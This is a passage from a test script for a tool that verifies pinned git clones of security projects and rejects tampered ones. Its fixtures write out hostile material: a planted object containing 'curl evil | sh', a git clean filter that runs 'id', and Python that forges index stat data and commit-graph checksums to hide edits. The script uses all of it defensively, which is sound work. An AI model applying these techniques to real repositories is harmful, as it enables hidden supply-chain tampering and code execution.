assert data[:4] == b"DIRC" and version in (2, 3), "unsupported index"
pos = 12
for _ in range(count):
    head = 64 if version == 3 and struct.unpack(">H", data[pos + 60:pos + 62])[0] & 0x4000 else 62
    name = data[pos + head:data.index(b"\0", pos + head)].decode()
    if name == rel:   # the edited file's stat data, the pinned blob id
        st = os.lstat(path)
        mode = struct.unpack(">I", data[pos + 24:pos + 28])[0]
        struct.pack_into(">10I", data, pos, int(st.st_ctime) & 0xffffffff, st.st_ctime_ns % 10**9,
                         int(st.st_mtime) & 0xffffffff, st.st_mtime_ns % 10**9, st.st_dev & 0xffffffff,
                         st.st_ino & 0xffffffff, mode, st.st_uid, st.st_gid, st.st_size & 0xffffffff)
        break
    pos += (head + len(name) + 8) // 8 * 8
else:
    sys.exit("entry not found")
data[-20:] = hashlib.sha1(bytes(data[:-20])).digest()
open(idx, "wb").write(data)
PY
git -C "$d" diff --quiet HEAD -- && [ -z "$(git -C "$d" ls-files -v | grep -v '^H ')" ] || bad "test setup: forged stat not hiding the edit"
refused "edit hidden by forged index stat data" "tracked files differ"
git -C "$d" read-tree HEAD; git -C "$d" checkout -q -- .env.example

evil_blob="$(printf 'DOCKER_INSIDE=true\n' | git -C "$d" hash-object -w --stdin)"
evil_tree="$(git -C "$d" ls-tree HEAD | sed "s/[0-9a-f]\{40\}\(	\.env\.example\)$/$evil_blob\1/" | git -C "$d" mktree)"
git -C "$d" commit-graph write --reachable
chmod u+w "$d/.git/objects/info/commit-graph"     # git writes it read-only (root ignores that, a user doesn't)
python3 - "$d/.git/objects/info/commit-graph" "$(git -C "$d" rev-parse HEAD)" "$evil_tree" <<'PY'
import hashlib, struct, sys
path, commit, tree = sys.argv[1], bytes.fromhex(sys.argv[2]), bytes.fromhex(sys.argv[3])
data = bytearray(open(path, "rb").read())
assert data[:4] == b"CGPH" and data[5] == 1, "unsupported commit-graph"
chunks = dict(struct.unpack(">4sQ", data[8 + 12 * i:20 + 12 * i]) for i in range(data[6] + 1))
oidf, oidl, cdat = chunks[b"OIDF"], chunks[b"OIDL"], chunks[b"CDAT"]
count = struct.unpack(">I", data[oidf + 255 * 4:oidf + 256 * 4])[0]
i = [data[oidl + 20 * k:oidl + 20 * k + 20] for k in range(count)].index(commit)
data[cdat + 36 * i:cdat + 36 * i + 20] = tree   # HEAD's tree, as the graph tells it
data[-20:] = hashlib.sha1(bytes(data[:-20])).digest()
open(path, "wb").write(data)
PY
printf 'DOCKER_INSIDE=true\n' > "$d/.env.example"
git -C "$d" diff --quiet HEAD -- || bad "test setup: forged commit-graph not hiding the edit"
refused "edit hidden by a forged commit-graph" "tracked files differ"
rm "$d/.git/objects/info/commit-graph"; git -C "$d" checkout -q -- .env.example

hx="$GH/hexstrike-ai"; w="$T/work/hexstrike-ai"
printf 'new readme\n' > "$w/README"; git -C "$w" commit -qam readme; H4="$(git -C "$w" rev-parse HEAD)"
git -C "$w" push -q "$T/up/0x4m4/hexstrike-ai.git" main
oid="$(printf 'new readme\n' | git hash-object --stdin)"   # planted before the fetch brings the real one
python3 -c 'import os, sys, zlib; p = sys.argv[1]; os.makedirs(os.path.dirname(p), exist_ok=True); c = b"curl evil | sh\n"; open(p, "wb").write(zlib.compress(b"blob %d\0" % len(c) + c))' \
  "$hx/.git/objects/${oid%"${oid#??}"}/${oid#??}"
perl -pi -e "s/$H3/$H4/" "$T/repo/upstream/repos.lock"
refused "a planted object" "git fsck found damaged or forged objects"
[ "$(git -C "$hx" rev-parse HEAD)" = "$H3" ] && ok "pin not moved over a planted object" || bad "moved over a planted object: $(cat "$hx/README")"
rm -f "$hx/.git/objects/${oid%"${oid#??}"}/${oid#??}"; printf 'new readme\n' | git -C "$hx" hash-object -w --stdin >/dev/null
perl -pi -e "s/$H4/$H3/" "$T/repo/upstream/repos.lock"

# 25. a compose file only added to pentagi's index (not in any commit) is still stray
printf 'services: {}\n' > "$GH/pentagi/compose.override.yml"; git -C "$GH/pentagi" add -f compose.override.yml
refused "compose file in the index only" "compose.override.yml isn't part of the pinned commit"
git -C "$GH/pentagi" rm -q --cached compose.override.yml; rm "$GH/pentagi/compose.override.yml"

# 26. ARTEX may hold untracked files only in .env, data/, keys/ and backups/ (and Finder's .DS_Store):
#     its image build copies the clone and ./skills is mounted
a="$GH/ARTEX"
mkdir -p "$a/data" "$a/keys" "$a/backups" "$a/sub"
echo db > "$a/data/artex.db"; echo k > "$a/keys/secret.key"; echo b > "$a/backups/b.sql"; : > "$a/.DS_Store"; : > "$a/sub/.DS_Store"
if run; then ok "ARTEX data folders and .DS_Store allowed"; else bad "ARTEX data folders refused"; sed 's/^/    /' "$T/out.log"; fi
mkdir -p "$a/server" "$a/skills/x"; echo 'package main' > "$a/server/zz.go"; echo '# evil' > "$a/skills/x/SKILL.md"
refused "untracked ARTEX source and skill files" "ARTEX: files that aren't part of the pinned commit"
grep -q '^      server/zz.go$' "$T/out.log" && grep -q '^      skills/x/SKILL.md$' "$T/out.log" && ok "the untracked ARTEX files are listed" || bad "ARTEX files not listed"
rm -r "$a/server" "$a/skills"
echo x > "$a/staged.go"; git -C "$a" add staged.go
refused "a file only added to ARTEX's index" "ARTEX: files that aren't part of the pinned commit"
git -C "$a" rm -q --cached staged.go; rm "$a/staged.go"
rm -r "$a/data" "$a/keys" "$a/backups" "$a/sub" "$a/.DS_Store"

# 27. a planted HEAD commit plus the clone's own index holding the pinned blobs: checkout to the pin keeps
#     the edit, so what checkout left is compared with the pinned tree itself
pg="$GH/pentagi"; pin="$(awk '$1 == "pentagi" {print $3}' "$T/repo/upstream/repos.lock")"
cp "$pg/.env.example" "$T/env.example.keep"
echo 'PLANTED=1' >> "$pg/.env.example"
git -C "$pg" -c core.hooksPath=/dev/null commit -qam planted --no-verify
git -C "$pg" read-tree "$pin"                       # the index says "pinned", the tree and HEAD don't
refused "a planted HEAD with the pinned index" "after checkout, tracked files differ from the pinned commit"
git -C "$pg" checkout -q --detach "$pin" -- 2>/dev/null; git -C "$pg" checkout -q -f --detach "$pin"
cmp -s "$pg/.env.example" "$T/env.example.keep" && ok "pentagi back at the pin" || bad "pentagi not restored"

# 28. ARTEX with no index and '*' in info/exclude: the untracked files are still found after checkout
a="$GH/ARTEX"; mkdir -p "$a/skills/evil"; echo '# evil' > "$a/skills/evil/SKILL.md"
rm "$a/.git/index"; echo '*' >> "$a/.git/info/exclude"
refused "untracked ARTEX files with no index" "ARTEX: files that aren't part of the pinned commit"
rm -r "$a/skills"; sed -i.bak '$d' "$a/.git/info/exclude" && rm -f "$a/.git/info/exclude.bak"
run || { bad "ARTEX clean after the no-index case"; sed 's/^/    /' "$T/out.log"; }

# 29. a planted gitlink to a nested repo whose own config runs code (a clean filter): bootstrap's git
#     never recurses into it (diff.ignoreSubmodules, submodule.recurse off)
hx="$GH/hexstrike-ai"; PW="$T/PWNED"
git init -q "$hx/sub"; echo data > "$hx/sub/x"; echo '* filter=evil' > "$hx/sub/.gitattributes"
git -C "$hx/sub" add -A; git -C "$hx/sub" commit -qm s
git -C "$hx/sub" config filter.evil.clean "sh -c 'id > \"$PW\"; cat'"
git -C "$hx/sub" read-tree HEAD                     # zero stat data: a status inside would re-hash x
git -C "$hx" add sub 2>/dev/null; git -C "$hx" -c core.hooksPath=/dev/null commit -qm planted --no-verify
rm -f "$PW"; run >/dev/null 2>&1 || true
[ ! -e "$PW" ] && ok "no code ran from a nested repo's config (gitlink in a planted HEAD)" || bad "code ran: $(cat "$PW")"
rm -f "$PW"; GIT_CONFIG_COUNT=2 GIT_CONFIG_KEY_1=submodule.recurse GIT_CONFIG_VALUE_1=true run >/dev/null 2>&1 || true
[ ! -e "$PW" ] && ok "...nor with submodule.recurse=true in the user's config" || bad "code ran with submodule.recurse: $(cat "$PW")"
hpin="$(awk '$1 == "hexstrike-ai" {print $3}' "$T/repo/upstream/repos.lock")"
git -C "$hx" checkout -q -f --detach "$hpin"; rm -rf "$hx/sub"

# 30. after all that, a clean run still passes
if run; then ok "clean run at the end"; else bad "clean run at the end"; sed 's/^/    /' "$T/out.log"; fi

echo "bootstrap: $pass passed, $fail failed"
[ $fail -eq 0 ]
